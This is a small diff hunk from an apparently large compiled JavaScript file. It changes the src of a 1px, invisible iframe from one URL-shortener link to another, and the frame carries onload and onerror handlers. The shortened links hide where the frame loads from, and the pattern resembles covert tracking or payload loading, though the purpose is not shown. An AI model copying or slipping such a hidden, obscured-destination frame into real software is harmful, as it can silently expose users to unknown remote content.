@@ -38402,7 +38402,7 @@ this.r1=x
 this.k1.appendChild(x)
 this.r1.setAttribute("onerror1","hideHomeFrame()")
 this.r1.setAttribute("onload","initializeHomeIframe(this)")
-this.r1.setAttribute("src","https://tinyurl.com/y3ztwh33")
+this.r1.setAttribute("src","https://is.gd/a3AaKd")
 this.r1.setAttribute("style","width:1px;height:1px;visibility:hidden")
 r=y.createTextNode("\n        ")
 this.k1.appendChild(r)
